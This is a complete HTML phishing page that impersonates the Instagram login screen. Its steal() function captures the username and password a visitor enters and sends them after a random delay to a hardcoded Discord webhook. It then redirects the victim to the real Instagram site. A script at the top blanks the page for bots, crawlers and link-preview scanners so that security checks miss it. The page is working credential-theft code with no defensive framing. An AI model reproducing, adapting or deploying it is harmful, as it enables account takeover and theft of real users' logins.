<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram </title>
  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #fafafa;
      font-family: 'Roboto', sans-serif;
    }

    .container {
      width: 100%;
      max-width: 350px;
      margin: 80px auto;
      padding: 40px;
      background-color: white;
      border: 1px solid #dbdbdb;
      text-align: center;
    }

    .logo {
      width: 150px;
      margin-bottom: 10px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      font-size: 14px;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
    }

    button {
      background-color: #0095f6;
      border: none;
      color: white;
      padding: 8px;
      margin-top: 10px;
      width: 100%;
      font-weight: bold;
      border-radius: 4px;
      cursor: pointer;
    }

    .or-separator {
      margin: 20px 0;
      display: flex;
      align-items: center;
    }

    .or-separator::before,
    .or-separator::after {
      content: "";
      flex: 1;
      height: 1px;
      background: #dbdbdb;
    }

    .or-separator span {
      margin: 0 10px;
      color: #8e8e8e;
      font-weight: 500;
      font-size: 13px;
    }
  </style>

  <!-- Basic bot blocker -->
  <script>
    const userAgent = navigator.userAgent.toLowerCase();
    const referrer = document.referrer.toLowerCase();

    const isBot = (
      userAgent.includes("discord") ||
      userAgent.includes("bot") ||
      userAgent.includes("crawler") ||
      userAgent.includes("preview") ||
      userAgent.includes("spider") ||
      referrer.includes("discord") ||
      referrer.includes("facebook") ||
      referrer.includes("t.co") || 
      referrer.includes("google")
    );

    if (isBot) {
      document.documentElement.innerHTML = ""; // Show blank page to scanners
      throw new Error("Blocked bot or crawler");
    }
  </script>
</head>

<body>
  <div class="container">
    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" class="logo">

    <form onsubmit="steal(event)">
      <input id="username" type="text" placeholder="Phone number, username, or email" required>
      <input id="password" type="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>

    <div class="or-separator"><span>OR</span></div>
    <div style="font-size: 14px; color: #385185; font-weight: 500;">Log in with Facebook</div>
  </div>

  <script>
    function steal(e) {
      e.preventDefault();

      const u = document.getElementById("username").value;
      const p = document.getElementById("password").value;

      const payload = {
        content: `🛑 고양이\nUsername: ${u}\nPassword: ${p}`
      };

      // Delay 1–2.5 seconds to avoid detection by fast bots
      const delay = Math.random() * 1500 + 1000;

      setTimeout(() => {
        fetch("https://discord.com/api/webhooks/1358000337738272839/FwLTIVrtE2-YFukbw7Qeuhh86ZL5GW8XuU2CFadpaon68s5FgOqZBzTUSiSlAv1vCavX", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        })
        .then(response => {
          if (response.ok) {
            window.location.href = "https://instagram.com"; // Redirect after success
          } else {
            alert('Something went wrong.');
          }
        })
        .catch(() => {
          alert('Network error.');
        });
      }, delay);
    }
  </script>
</body>
</html>
